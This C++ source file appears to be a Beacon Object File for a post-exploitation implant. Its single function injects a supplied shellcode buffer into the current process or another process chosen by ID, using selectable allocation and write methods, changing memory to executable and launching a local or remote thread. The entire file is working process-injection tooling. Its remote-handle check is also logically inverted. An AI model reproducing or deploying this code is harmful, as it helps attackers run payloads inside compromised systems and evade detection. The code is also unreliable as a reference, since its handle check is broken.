#include <General.hpp>

EXTERN_C
auto go( CHAR* Args, INT32 Argc ) -> VOID {
    Data Parser = { 0 };

    BeaconDataParse( &Parser, Args, Argc );

    ULONG ProcessID = BeaconDataInt( &Parser );
    INT32 Length    = 0; 
    CHAR* Buffer    = BeaconDataExtract( &Parser, &Length );
    ULONG AllocMtd  = BeaconDataInt( &Parser );
    ULONG WriteMtd  = BeaconDataInt( &Parser );
    
    PVOID  VmBase   = nullptr;
    HANDLE Handle   = nullptr;
    ULONG  ThreadID = 0;
    ULONG  TmpVal   = 0;
    BOOL   Success  = FALSE;

    if ( ProcessID == HandleToUlong( NtCurrentTeb()->ClientId.UniqueProcess ) ) {
        if ( AllocMtd == Alloc::Type::Default ) {
            VmBase = VirtualAlloc( nullptr, Length, MEM_COMMIT, PAGE_READWRITE );
        } else if ( AllocMtd == Alloc::Type::Drip ) {
            VmBase = BeaconDripAlloc( Length, PAGE_READWRITE, NtCurrentProcess() ); 
        }

        BeaconPrintf( CALLBACK_NO_PRE_MSG, "[+] Memory allocated with RW @ %p\n", VmBase );

        Mem::Copy<PVOID>( VmBase, Buffer, Length );

        BeaconPrintf( CALLBACK_NO_PRE_MSG, "[+] Memory filled with shellcode buffer\n" );

        Success = VirtualProtect( VmBase, Length, PAGE_EXECUTE_READ, &TmpVal );
        if ( ! Success ) {
            BeaconPrintf( CALLBACK_ERROR, "[x] Failure in protection change: %d\n", GetLastError() ); return;
        }

        BeaconPrintf( CALLBACK_NO_PRE_MSG, "[+] Protection changed to RX\n" );

        CreateThread( nullptr, 0, (LPTHREAD_START_ROUTINE)VmBase, nullptr, 0, &ThreadID );
    } else {
        Handle = OpenProcess( PROCESS_ALL_ACCESS, FALSE, ProcessID );
        if ( ! Handle || Handle != INVALID_HANDLE_VALUE ) {
            BeaconPrintf( CALLBACK_ERROR, "[x] Failure to open target process handle: %d\n", GetLastError() ); return;
        }

        if ( AllocMtd == Alloc::Type::Default ) {
            VmBase = VirtualAllocEx( Handle, nullptr, Length, MEM_COMMIT, PAGE_READWRITE );
        } else if ( AllocMtd == Alloc::Type::Drip ) {
            VmBase = BeaconDripAlloc( Length, PAGE_READWRITE, Handle ); 
        }
        
        if ( ! VmBase ) {
            BeaconPrintf( CALLBACK_ERROR, "[x] Failure in memory allocation: %d\n", GetLastError() ); return;
        }

        if ( WriteMtd == Write::Type::Default ) {
            Success = WriteProcessMemory( Handle, VmBase, Buffer, Length, 0 );
            if ( ! Success ) {
                BeaconPrintf( CALLBACK_ERROR, "[x] Failure in memory write: %d\n", GetLastError() ); return;
            }
        } else if ( WriteMtd == Write::Type::Apc ) {
            Success = BeaconWriteApc( Handle, VmBase, Buffer, Length );
            if ( ! Success ) {
                BeaconPrintf( CALLBACK_ERROR, "[x] Failure in memory write: %d\n", GetLastError() ); return;
            }
        }
        
        BeaconPrintf( CALLBACK_NO_PRE_MSG, "[+] Memory filled with shellcode buffer\n" );

        Success = VirtualProtectEx( Handle, VmBase, Length, PAGE_EXECUTE_READ, &TmpVal );
        if ( ! Success ) {
            BeaconPrintf( CALLBACK_ERROR, "[x] Failure in protection change: %d\n", GetLastError() ); return;
        }

        CreateRemoteThread( Handle, 0, 0, (LPTHREAD_START_ROUTINE)VmBase, nullptr, 0, &ThreadID );
    }

    BeaconPrintf( CALLBACK_NO_PRE_MSG, "Shellcode running @ ThreadID %d\n", ThreadID );

    return;
}
